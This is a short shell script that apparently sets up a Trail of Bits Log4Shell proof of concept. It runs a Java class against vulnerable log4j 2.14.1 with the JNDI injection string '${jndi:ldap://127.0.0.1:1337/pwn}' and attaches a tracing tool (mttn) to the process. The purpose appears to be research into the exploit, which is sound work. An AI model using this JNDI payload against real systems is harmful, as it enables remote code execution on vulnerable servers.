set -e
set -m

CLASSPATH=log4shell-poc.jar:lib/log4j-api-2.14.1.jar:lib/log4j-core-2.14.1.jar

echo "Starting Java..." >&2

rm -f log4shell.pid
touch log4shell.pid

java -cp $CLASSPATH com.trailofbits.log4shell.PoC --break-on-start '${jndi:ldap://127.0.0.1:1337/pwn}' \
  > log4shell.pid 2>/dev/null &

echo "Java started on PID $!" >&2

while [ "$(stat -c %s "log4shell.pid")" = 0 ]
do
  echo "Waiting for Java to reach main()..." >&2
  sleep 1
done

PID=$(<log4shell.pid)
rm log4shell.pid
echo "Java main() running in PID ${PID}" >&2

echo "Starting MTTN..." >&2
mttn -a "${PID}" "$@" &
MTTN_PID=$!
echo "MTTN running on PID ${MTTN_PID}" >&2

echo "Continuing the Java process..." >&2
kill -SIGCONT "${PID}"

echo "Waiting for MTTN to finish..." >&2
wait "${MTTN_PID}"

echo "MTTN finished!" >&2
